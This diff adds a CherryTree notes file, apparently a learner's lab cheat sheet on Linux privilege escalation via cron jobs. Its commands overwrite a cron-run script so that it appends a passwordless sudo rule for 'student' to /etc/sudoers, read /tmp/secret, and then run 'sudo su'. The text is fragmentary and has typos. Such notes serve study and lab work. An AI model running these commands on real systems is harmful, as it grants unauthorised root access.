@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="52" master_id="0" name="Cron Jobs" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730895449" ts_lastsave="1730895454">
+    <rich_text>can salso be run as any user on the system.
+
+```
+
+
+
+
+crontab -l 
+</rich_text>
+    <codebox char_offset="45" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">
+grep -rnw /usr -e "route/i/want/to/see"
+ls -al /tmp
+cat /tmp/secret
+</codebox>
+    <codebox char_offset="52" justification="left" frame_width="689" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; /usr/local/share/copy.sh
+cat /usr/local/share/copy.sh
+
+#print: #!/bin/bash
+
+sudo -l
+#print: User franch may run the followin comands on machine_name:
+(root) NOPASSWD: /etc/init.d/cron
+(root) NOPASSWD: all
+sudo su 
+</codebox>
+  </node>
+</cherrytree>
